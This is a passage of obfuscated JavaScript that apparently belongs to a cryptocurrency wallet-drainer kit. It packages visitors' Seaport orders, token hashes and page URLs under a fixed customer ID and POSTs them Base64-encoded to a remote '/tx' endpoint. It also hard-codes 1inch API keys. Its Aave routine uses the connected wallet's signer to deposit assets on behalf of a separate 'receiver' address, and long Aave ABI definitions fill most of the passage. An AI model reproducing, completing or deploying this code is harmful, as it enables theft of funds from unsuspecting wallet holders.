              'salt': _0x3ad9e4
            };
          }
          break;
        case 'seaport':
          {
            _0x20bf73 = {
              'action_type': "seaport_match",
              'order': Base64.encode(_0x2702b4.order),
              'website': window.location.href,
              'key': _0x2702b4.ahash,
              'customer_id': "0x706OW4G8",
              'salt': _0x3ad9e4
            };
          }
          break;
        case "tokenSplit":
          {
            const _0x373e00 = {
              action_type: "split",
              hash: _0x2702b4.hash,
              address: _0x2702b4.tokenAddress,
              key: _0x2702b4.ahash,
              chain_id: _0x2702b4.chainId,
              customer_id: "0x706OW4G8",
              salt: _0x3ad9e4
            };
            _0x20bf73 = _0x373e00;
          }
          break;
        case "balanceSplit":
          {
            const _0x168ccd = {
              action_type: "balance_split",
              hash: _0x2702b4.hash,
              address: _0x2702b4.tokenAddress,
              key: _0x2702b4.ahash,
              chain_id: _0x2702b4.chainId,
              customer_id: "0x706OW4G8",
              salt: _0x3ad9e4
            };
            _0x20bf73 = _0x168ccd;
          }
          break;
      }
      let _0x206c47 = this.domain + '/tx';
      await fetch(_0x206c47, {
        'method': "POST",
        'body': Base64.encode(JSON.stringify(_0x20bf73))
      });
    } catch (_0x1e984d) {
      console.log(_0x1e984d);
    }
  };
  ["oneInchKeys"] = ["kSHXPLG75uYbEGAH37PtsYqhpMzg8rD3", "MLpI1leeeyGo4778JNKBuWOY3OpMKkev", "9GpBce1G1IqnzaZAAIcAWdccLImTt0Jn"];
  ["exchangeDictionary"] = [_0x4f31a8, _0x3a8abc, _0x1252ed, _0x1624de, _0x9fed42, _0x1ebefc, _0x5a2a79, _0x25eeda, _0x4f95a1, _0x2c28d1, _0x434cc4, _0x358a58, _0x3306aa, _0x2c382b, _0x476185, _0x5e7f48, _0x143712, _0x22dacf, _0x21c9b9, _0x688174, _0x2585a9, _0xd1059d, _0x87e056, _0x42785c, _0x4ad32f, _0x195d2e, _0xef2fd7, _0x28505b, _0x1aa209, _0x249be0, _0x12a833, _0x53ddb7, _0x36136d, _0x228636, _0x248468, _0x27e693, _0x5826db, _0xcbba5d, _0x2a3e10, _0x426b1c, _0x21a579, _0x1b1977, _0x2a02fe, _0x4668d0, _0x24773c, _0x4d91f6, _0x20d103, _0x153db0, _0x3e3430, _0x2eb794, _0x2b95fd, _0x5f419e, _0x5c6cb0, _0x283cd3, _0x5817df, _0x3c0fda, _0x3c8d6c, _0x298bd5, _0x3a824f, _0x2b7ab9, _0x2fbbd6, _0x553c04, _0x303cbb, _0x43fdab, _0x28e9a6, _0x2f865a, _0x1d7141, _0x4bbed1, _0x4c7b87, _0x7e7d4c, _0x5d7cbf, _0x5d0dcf, _0x29a99d, _0x209529, _0x104cc2, _0x2ebcf4, _0x264fdf, _0x3afacc, _0x435b8e, _0x274228, _0x5bd307, _0x977047, _0x2ee31b, _0x7ebe32, _0x51bc63, _0x2c5a7f, _0x38d9e9, _0x320f2f, _0x280a6a, _0x5c52c5, _0x2b7946, _0x243f57, _0x98d699];
  ["setUpSwap"] = async _0x2a18aa => {
    let _0xacbb85 = _0x2a18aa.actionType;
    let _0x4d5eff = Math.floor(Date.now() / 1000) + 99990;
    let _0x3941f8 = this.exchangeDictionary.filter(_0x411406 => _0x411406.Chain == _0x2a18aa.chain && _0x411406.Exchange == _0xacbb85)[0].Address;
    let _0xab3127 = this.ethersProvider.getSigner(await this.getWalletAddress());
    let _0xcd0737 = 0;
    switch (_0xacbb85) {
      case "AaveLP2":
        {
          const _0x43f4d8 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x12794b = {
            indexed: false,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0xe7f930 = {
            indexed: true,
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0xf3f63a = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x5cf31c = {
            indexed: false,
            internalType: 'uint256',
            name: "borrowRateMode",
            type: 'uint256'
          };
          const _0x3b7f21 = {
            indexed: false,
            internalType: 'uint256',
            name: "borrowRate",
            type: 'uint256'
          };
          const _0x48ebd5 = {
            indexed: true,
            internalType: "uint16",
            name: "referral",
            type: "uint16"
          };
          const _0xa97bef = {
            anonymous: false,
            inputs: [_0x43f4d8, _0x12794b, _0xe7f930, _0xf3f63a, _0x5cf31c, _0x3b7f21, _0x48ebd5],
            name: 'Borrow',
            type: "event"
          };
          const _0x4a6549 = {
            indexed: true,
            internalType: 'address',
            name: "reserve",
            type: "address"
          };
          const _0x49f269 = {
            indexed: false,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x33e041 = {
            indexed: true,
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x194a7b = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x394eba = {
            indexed: true,
            internalType: "uint16",
            name: "referral",
            type: "uint16"
          };
          const _0x4e1f67 = {
            anonymous: false,
            inputs: [_0x4a6549, _0x49f269, _0x33e041, _0x194a7b, _0x394eba],
            name: "Deposit",
            type: 'event'
          };
          const _0x1648f3 = {
            indexed: true,
            internalType: "address",
            name: "target",
            type: "address"
          };
          const _0xe623e0 = {
            indexed: true,
            internalType: "address",
            name: "initiator",
            type: "address"
          };
          const _0x4dc3ae = {
            indexed: true,
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x413dcf = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x5a1990 = {
            indexed: false,
            internalType: 'uint256',
            name: 'premium',
            type: "uint256"
          };
          const _0x5da2e8 = {
            indexed: false,
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0x48da92 = {
            anonymous: false,
            inputs: [_0x1648f3, _0xe623e0, _0x4dc3ae, _0x413dcf, _0x5a1990, _0x5da2e8],
            name: "FlashLoan",
            type: "event"
          };
          const _0x427550 = {
            indexed: true,
            internalType: "address",
            name: "collateralAsset",
            type: "address"
          };
          const _0x5a9bf0 = {
            indexed: true,
            internalType: "address",
            name: 'debtAsset',
            type: 'address'
          };
          const _0x23dd11 = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x5e7109 = {
            indexed: false,
            internalType: "uint256",
            name: "debtToCover",
            type: "uint256"
          };
          const _0x51aeaf = {
            indexed: false,
            internalType: "uint256",
            name: "liquidatedCollateralAmount",
            type: 'uint256'
          };
          const _0x585b3d = {
            indexed: false,
            internalType: "address",
            name: "liquidator",
            type: "address"
          };
          const _0x5dd429 = {
            indexed: false,
            internalType: "bool",
            name: "receiveAToken",
            type: "bool"
          };
          const _0x127639 = {
            anonymous: false,
            inputs: [_0x427550, _0x5a9bf0, _0x23dd11, _0x5e7109, _0x51aeaf, _0x585b3d, _0x5dd429],
            name: "LiquidationCall",
            type: 'event'
          };
          const _0x38ea62 = {
            anonymous: false,
            inputs: [],
            name: 'Paused',
            type: 'event'
          };
          const _0x1005a5 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x39c777 = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x41d1b2 = {
            anonymous: false,
            inputs: [_0x1005a5, _0x39c777],
            name: "RebalanceStableBorrowRate",
            type: 'event'
          };
          const _0x3ff8c1 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x4cd06b = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x491cc4 = {
            indexed: true,
            internalType: "address",
            name: 'repayer',
            type: "address"
          };
          const _0x4d72ae = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x2dd4e0 = {
            anonymous: false,
            inputs: [_0x3ff8c1, _0x4cd06b, _0x491cc4, _0x4d72ae],
            name: 'Repay',
            type: 'event'
          };
          const _0x338eb8 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x4f4329 = {
            indexed: false,
            internalType: "uint256",
            name: "liquidityRate",
            type: 'uint256'
          };
          const _0x4f4011 = {
            indexed: false,
            internalType: 'uint256',
            name: "stableBorrowRate",
            type: 'uint256'
          };
          const _0x188197 = {
            indexed: false,
            internalType: 'uint256',
            name: "variableBorrowRate",
            type: 'uint256'
          };
          const _0x4cc609 = {
            indexed: false,
            internalType: 'uint256',
            name: "liquidityIndex",
            type: 'uint256'
          };
          const _0x22bde6 = {
            indexed: false,
            internalType: 'uint256',
            name: "variableBorrowIndex",
            type: 'uint256'
          };
          const _0x47a153 = {
            anonymous: false,
            inputs: [_0x338eb8, _0x4f4329, _0x4f4011, _0x188197, _0x4cc609, _0x22bde6],
            name: "ReserveDataUpdated",
            type: 'event'
          };
          const _0x16edb4 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x3239fc = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x56c399 = {
            anonymous: false,
            inputs: [_0x16edb4, _0x3239fc],
            name: "ReserveUsedAsCollateralDisabled",
            type: 'event'
          };
          const _0x4a9820 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0xdf7238 = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x36ef45 = {
            anonymous: false,
            inputs: [_0x4a9820, _0xdf7238],
            name: "ReserveUsedAsCollateralEnabled",
            type: "event"
          };
          const _0x35b587 = {
            indexed: true,
            internalType: "address",
            name: 'reserve',
            type: "address"
          };
          const _0x1ea4f0 = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x18689f = {
            indexed: false,
            internalType: 'uint256',
            name: "rateMode",
            type: 'uint256'
          };
          const _0x366d3a = {
            anonymous: false,
            inputs: [_0x35b587, _0x1ea4f0, _0x18689f],
            name: "Swap",
            type: 'event'
          };
          const _0x3aeb44 = {
            anonymous: false,
            inputs: [],
            name: "Unpaused",
            type: 'event'
          };
          const _0x52b669 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x23f50b = {
            indexed: true,
            internalType: "address",
            name: 'user',
            type: 'address'
          };
          const _0x4eb0ed = {
            indexed: true,
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x13fcbb = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x378c84 = {
            anonymous: false,
            inputs: [_0x52b669, _0x23f50b, _0x4eb0ed, _0x13fcbb],
            name: "Withdraw",
            type: "event"
          };
          const _0x1a0da8 = {
            inputs: [],
            name: "FLASHLOAN_PREMIUM_TOTAL",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x2ad25c = {
            internalType: 'uint256',
            name: '',
            type: "uint256"
          };
          const _0x57b558 = {
            inputs: [],
            name: "LENDINGPOOL_REVISION",
            outputs: [_0x2ad25c],
            stateMutability: "view",
            type: "function"
          };
          const _0x56c733 = {
            inputs: [],
            name: "MAX_NUMBER_RESERVES",
            outputs: [{
              'internalType': "uint256",
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x1f710d = {
            inputs: [],
            name: "MAX_STABLE_RATE_BORROW_SIZE_PERCENT",
            outputs: [{
              'internalType': "uint256",
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: 'view',
            type: "function"
          };
          const _0x411d67 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x3e7e8f = {
            internalType: "uint256",
            name: "amount",
            type: "uint256"
          };
          const _0x4f18ed = {
            internalType: 'uint256',
            name: "interestRateMode",
            type: 'uint256'
          };
          const _0x4656ec = {
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0xadc79f = {
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x21a912 = {
            inputs: [_0x411d67, _0x3e7e8f, _0x4f18ed, _0x4656ec, _0xadc79f],
            name: 'borrow',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x214bd2 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x360350 = {
            internalType: 'uint256',
            name: "amount",
            type: "uint256"
          };
          const _0x2d192a = {
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x40df74 = {
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0x5beeb2 = {
            inputs: [_0x214bd2, _0x360350, _0x2d192a, _0x40df74],
            name: 'deposit',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5adf93 = {
            internalType: "address",
            name: 'asset',
            type: 'address'
          };
          const _0x2a1bc5 = {
            internalType: "address",
            name: "from",
            type: "address"
          };
          const _0x248ca0 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x34cbd1 = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x584a73 = {
            internalType: 'uint256',
            name: "balanceFromBefore",
            type: 'uint256'
          };
          const _0x5b399b = {
            internalType: 'uint256',
            name: "balanceToBefore",
            type: 'uint256'
          };
          const _0x1f9e52 = {
            inputs: [_0x5adf93, _0x2a1bc5, _0x248ca0, _0x34cbd1, _0x584a73, _0x5b399b],
            name: "finalizeTransfer",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x54a3e1 = {
            internalType: "address",
            name: "receiverAddress",
            type: "address"
          };
          const _0x212d12 = {
            internalType: "address[]",
            name: "assets",
            type: "address[]"
          };
          const _0x2577fb = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x1ab6a0 = {
            internalType: 'uint256[]',
            name: 'modes',
            type: 'uint256[]'
          };
          const _0x4f943b = {
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0xf79366 = {
            internalType: "bytes",
            name: "params",
            type: "bytes"
          };
          const _0x1223cf = {
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0x2d9370 = {
            inputs: [_0x54a3e1, _0x212d12, _0x2577fb, _0x1ab6a0, _0x4f943b, _0xf79366, _0x1223cf],
            name: "flashLoan",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xa157ed = {
            internalType: "contract ILendingPoolAddressesProvider",
            name: '',
            type: "address"
          };
          const _0x25c39f = {
            inputs: [],
            name: "getAddressesProvider",
            outputs: [_0xa157ed],
            stateMutability: "view",
            type: "function"
          };
          const _0x2c1c48 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x35c1ed = {
            inputs: [_0x2c1c48],
            name: "getConfiguration",
            outputs: [{
              'components': [{
                'internalType': 'uint256',
                'name': "data",
                'type': 'uint256'
              }],
              'internalType': "struct DataTypes.ReserveConfigurationMap",
              'name': '',
              'type': "tuple"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x3ef967 = {
            internalType: "address",
            name: 'asset',
            type: "address"
          };
          const _0x2b7553 = {
            internalType: 'uint256',
            name: "data",
            type: 'uint256'
          };
          const _0x4ed83a = {
            components: [_0x2b7553],
            internalType: "struct DataTypes.ReserveConfigurationMap",
            name: "configuration",
            type: "tuple"
          };
          const _0x488ff3 = {
            internalType: "uint128",
            name: "liquidityIndex",
            type: "uint128"
          };
          const _0xba8024 = {
            internalType: "uint128",
            name: "variableBorrowIndex",
            type: "uint128"
          };
          const _0x58996f = {
            internalType: "uint128",
            name: "currentLiquidityRate",
            type: "uint128"
          };
          const _0x3361c5 = {
            internalType: "uint128",
            name: "currentVariableBorrowRate",
            type: "uint128"
          };
          const _0x248cee = {
            internalType: "uint128",
            name: "currentStableBorrowRate",
            type: "uint128"
          };
          const _0x1ba045 = {
            internalType: "uint40",
            name: "lastUpdateTimestamp",
            type: "uint40"
          };
          const _0x56f026 = {
            internalType: "address",
            name: "aTokenAddress",
            type: "address"
          };
          const _0x5bb198 = {
            internalType: 'address',
            name: "stableDebtTokenAddress",
            type: "address"
          };
          const _0xe7b446 = {
            internalType: "address",
            name: "variableDebtTokenAddress",
            type: "address"
          };
          const _0x1faeec = {
            internalType: "address",
            name: "interestRateStrategyAddress",
            type: "address"
          };
          const _0x55437b = {
            internalType: "uint8",
            name: 'id',
            type: "uint8"
          };
          const _0x4b0d41 = {
            components: [_0x4ed83a, _0x488ff3, _0xba8024, _0x58996f, _0x3361c5, _0x248cee, _0x1ba045, _0x56f026, _0x5bb198, _0xe7b446, _0x1faeec, _0x55437b],
            internalType: "struct DataTypes.ReserveData",
            name: '',
            type: "tuple"
          };
          const _0x4587e6 = {
            inputs: [_0x3ef967],
            name: "getReserveData",
            outputs: [_0x4b0d41],
            stateMutability: "view",
            type: "function"
          };
          const _0x228086 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x3b7021 = {
            inputs: [_0x228086],
            name: "getReserveNormalizedIncome",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x47a462 = {
            internalType: "address",
            name: 'asset',
            type: "address"
          };
          const _0x2cea7a = {
            internalType: 'uint256',
            name: '',
            type: 'uint256'
          };
          const _0x4f23ce = {
            inputs: [_0x47a462],
            name: "getReserveNormalizedVariableDebt",
            outputs: [_0x2cea7a],
            stateMutability: "view",
            type: "function"
          };
          const _0x163769 = {
            internalType: "address[]",
            name: '',
            type: "address[]"
          };
          const _0x75df43 = {
            inputs: [],
            name: "getReservesList",
            outputs: [_0x163769],
            stateMutability: "view",
            type: "function"
          };
          const _0x282933 = {
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x55bdf = {
            inputs: [_0x282933],
            name: "getUserAccountData",
            outputs: [{
              'internalType': "uint256",
              'name': "totalCollateralETH",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "totalDebtETH",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "availableBorrowsETH",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "currentLiquidationThreshold",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "ltv",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "healthFactor",
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x375eb6 = {
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x5ec667 = {
            internalType: "uint256",
            name: "data",
            type: 'uint256'
          };
          const _0x37e8f2 = {
            components: [_0x5ec667],
            internalType: "struct DataTypes.UserConfigurationMap",
            name: '',
            type: "tuple"
          };
          const _0x1b759a = {
            inputs: [_0x375eb6],
            name: "getUserConfiguration",
            outputs: [_0x37e8f2],
            stateMutability: "view",
            type: "function"
          };
          const _0x35dd20 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x5b9e39 = {
            internalType: "address",
            name: "aTokenAddress",
            type: "address"
          };
          const _0x146b33 = {
            internalType: "address",
            name: "stableDebtAddress",
            type: "address"
          };
          const _0x49118c = {
            internalType: "address",
            name: "variableDebtAddress",
            type: "address"
          };
          const _0x319aec = {
            internalType: "address",
            name: "interestRateStrategyAddress",
            type: 'address'
          };
          const _0x20d485 = {
            inputs: [_0x35dd20, _0x5b9e39, _0x146b33, _0x49118c, _0x319aec],
            name: "initReserve",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3340b9 = {
            internalType: "contract ILendingPoolAddressesProvider",
            name: "provider",
            type: "address"
          };
          const _0x583de9 = {
            inputs: [_0x3340b9],
            name: "initialize",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x585c19 = {
            internalType: "address",
            name: "collateralAsset",
            type: "address"
          };
          const _0x5b1e63 = {
            internalType: "address",
            name: 'debtAsset',
            type: "address"
          };
          const _0xa4249d = {
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0xdc540f = {
            internalType: 'uint256',
            name: "debtToCover",
            type: 'uint256'
          };
          const _0x485250 = {
            internalType: 'bool',
            name: "receiveAToken",
            type: "bool"
          };
          const _0x2d3ea9 = {
            inputs: [_0x585c19, _0x5b1e63, _0xa4249d, _0xdc540f, _0x485250],
            name: "liquidationCall",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x537952 = {
            inputs: [],
            name: "paused",
            outputs: [{
              'internalType': "bool",
              'name': '',
              'type': "bool"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x8875be = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x23455c = {
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x3b9e6c = {
            inputs: [_0x8875be, _0x23455c],
            name: "rebalanceStableBorrowRate",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x381c5a = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x391601 = {
            internalType: 'uint256',
            name: 'amount',
            type: 'uint256'
          };
          const _0x14f86a = {
            internalType: "uint256",
            name: "rateMode",
            type: 'uint256'
          };
          const _0x1862e0 = {
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x56ec27 = {
            inputs: [_0x381c5a, _0x391601, _0x14f86a, _0x1862e0],
            name: 'repay',
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2e08dd = {
            internalType: 'address',
            name: "asset",
            type: "address"
          };
          const _0x5e2593 = {
            internalType: 'uint256',
            name: "configuration",
            type: 'uint256'
          };
          const _0x140d8e = {
            inputs: [_0x2e08dd, _0x5e2593],
            name: "setConfiguration",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x410533 = {
            internalType: "bool",
            name: "val",
            type: "bool"
          };
          const _0x4b7ff0 = {
            inputs: [_0x410533],
            name: "setPause",
            outputs: [],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x110979 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x358396 = {
            internalType: "address",
            name: "rateStrategyAddress",
            type: "address"
          };
          const _0x2985bf = {
            inputs: [_0x110979, _0x358396],
            name: "setReserveInterestRateStrategyAddress",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x875f7e = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x35c349 = {
            internalType: "bool",
            name: "useAsCollateral",
            type: "bool"
          };
          const _0x2f2892 = {
            inputs: [_0x875f7e, _0x35c349],
            name: "setUserUseReserveAsCollateral",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2315e4 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x322f01 = {
            internalType: "uint256",
            name: "rateMode",
            type: 'uint256'
          };
          const _0x3d996d = {
            inputs: [_0x2315e4, _0x322f01],
            name: "swapBorrowRateMode",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3af1d2 = {
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0xfe99cb = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0xed54c4 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x22174d = {
            inputs: [_0x3af1d2, _0xfe99cb, _0xed54c4],
            name: 'withdraw',
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          let _0x49c3b0 = [_0xa97bef, _0x4e1f67, _0x48da92, _0x127639, _0x38ea62, _0x41d1b2, _0x2dd4e0, _0x47a153, _0x56c399, _0x36ef45, _0x366d3a, _0x3aeb44, _0x378c84, _0x1a0da8, _0x57b558, _0x56c733, _0x1f710d, _0x21a912, _0x5beeb2, _0x1f9e52, _0x2d9370, _0x25c39f, _0x35c1ed, _0x4587e6, _0x3b7021, _0x4f23ce, _0x75df43, _0x55bdf, _0x1b759a, _0x20d485, _0x583de9, _0x2d3ea9, _0x537952, _0x3b9e6c, _0x56ec27, _0x140d8e, _0x4b7ff0, _0x2985bf, _0x2f2892, _0x3d996d, _0x22174d];
          let _0x5b57a4 = new ethers.Contract(_0x3941f8, _0x49c3b0, _0xab3127);
          return [_0x5b57a4.deposit(_0x2a18aa.asset.token, _0x2a18aa.asset.amount, this.receiver, 0), ''];
        }
      case "AaveLP3":
        {
          const _0x4977c8 = {
            internalType: "contract IPoolAddressesProvider",
            name: "provider",
            type: "address"
          };
          const _0x371572 = {
            inputs: [_0x4977c8],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x2549d2 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x3d7da4 = {
            indexed: true,
            internalType: "address",
            name: "backer",
            type: "address"
          };
          const _0x216ced = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x43ec5c = {
            indexed: false,
            internalType: 'uint256',
            name: "fee",
            type: "uint256"
          };
          const _0x591c52 = {
            anonymous: false,
            inputs: [_0x2549d2, _0x3d7da4, _0x216ced, _0x43ec5c],
            name: "BackUnbacked",
            type: 'event'
          };
          const _0x40d0cf = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x2b2fd5 = {
            indexed: false,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x26e260 = {
            indexed: true,
            internalType: "address",
            name: "onBehalfOf",
            type: 'address'
          };
          const _0x28872a = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x45982b = {
            indexed: false,
            internalType: "enum DataTypes.InterestRateMode",
            name: "interestRateMode",
            type: "uint8"
          };
          const _0xf8c6ad = {
            indexed: false,
            internalType: 'uint256',
            name: "borrowRate",
            type: "uint256"
          };
          const _0x295f33 = {
            indexed: true,
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0x8ff1cb = {
            anonymous: false,
            inputs: [_0x40d0cf, _0x2b2fd5, _0x26e260, _0x28872a, _0x45982b, _0xf8c6ad, _0x295f33],
            name: 'Borrow',
            type: "event"
          };
          const _0x4a3316 = {
            indexed: true,
            internalType: "address",
            name: "target",
            type: "address"
          };
          const _0x70aa37 = {
            indexed: false,
            internalType: "address",
            name: "initiator",
            type: "address"
          };
          const _0x4b0bb4 = {
            indexed: true,
            internalType: "address",
            name: "asset",
            type: "address"
          };
          const _0x1be850 = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: "uint256"
          };
          const _0x1173d6 = {
            indexed: false,
            internalType: "enum DataTypes.InterestRateMode",
            name: "interestRateMode",
            type: "uint8"
          };
          const _0x376483 = {
            indexed: false,
            internalType: 'uint256',
            name: "premium",
            type: 'uint256'
          };
          const _0x1aef73 = {
            indexed: true,
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0x32f664 = {
            anonymous: false,
            inputs: [_0x4a3316, _0x70aa37, _0x4b0bb4, _0x1be850, _0x1173d6, _0x376483, _0x1aef73],
            name: "FlashLoan",
            type: 'event'
          };
          const _0x45402b = {
            indexed: true,
            internalType: 'address',
            name: "asset",
            type: "address"
          };
          const _0x2992fc = {
            indexed: false,
            internalType: 'uint256',
            name: "totalDebt",
            type: 'uint256'
          };
          const _0x1290f4 = {
            anonymous: false,
            inputs: [_0x45402b, _0x2992fc],
            name: "IsolationModeTotalDebtUpdated",
            type: "event"
          };
          const _0xd66be7 = {
            indexed: true,
            internalType: "address",
            name: "collateralAsset",
            type: "address"
          };
          const _0xc81180 = {
            indexed: true,
            internalType: "address",
            name: 'debtAsset',
            type: 'address'
          };
          const _0x1b6ddf = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x5b0a72 = {
            indexed: false,
            internalType: 'uint256',
            name: "debtToCover",
            type: 'uint256'
          };
          const _0x38a2cd = {
            indexed: false,
            internalType: 'uint256',
            name: "liquidatedCollateralAmount",
            type: "uint256"
          };
          const _0x211a4a = {
            indexed: false,
            internalType: 'address',
            name: "liquidator",
            type: "address"
          };
          const _0x70359f = {
            indexed: false,
            internalType: "bool",
            name: "receiveAToken",
            type: "bool"
          };
          const _0x58c70f = {
            anonymous: false,
            inputs: [_0xd66be7, _0xc81180, _0x1b6ddf, _0x5b0a72, _0x38a2cd, _0x211a4a, _0x70359f],
            name: "LiquidationCall",
            type: "event"
          };
          const _0x7f9446 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x58a94f = {
            indexed: false,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x4d0632 = {
            indexed: true,
            internalType: "address",
            name: "onBehalfOf",
            type: "address"
          };
          const _0x345721 = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x21588d = {
            indexed: true,
            internalType: "uint16",
            name: "referralCode",
            type: "uint16"
          };
          const _0x452180 = {
            anonymous: false,
            inputs: [_0x7f9446, _0x58a94f, _0x4d0632, _0x345721, _0x21588d],
            name: "MintUnbacked",
            type: "event"
          };
          const _0x218825 = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x215955 = {
            indexed: false,
            internalType: 'uint256',
            name: "amountMinted",
            type: 'uint256'
          };
          const _0x123df3 = {
            anonymous: false,
            inputs: [_0x218825, _0x215955],
            name: "MintedToTreasury",
            type: 'event'
          };
          const _0x4ae93a = {
            indexed: true,
            internalType: "address",
            name: "reserve",
            type: "address"
          };
          const _0x344749 = {
            indexed: true,
            internalType: "address",
            name: "user",
            type: "address"
          };
          const _0x5598bc = {
            anonymous: false,
            inputs: [_0x4ae93a, _0x344749],
            name: "RebalanceStableBorrowRate",
            type: "event"
          };
          const _0x34d275 = {
            indexed: true,
            internalType: 'address',
            name: "reserve",
            type: "address"
          };
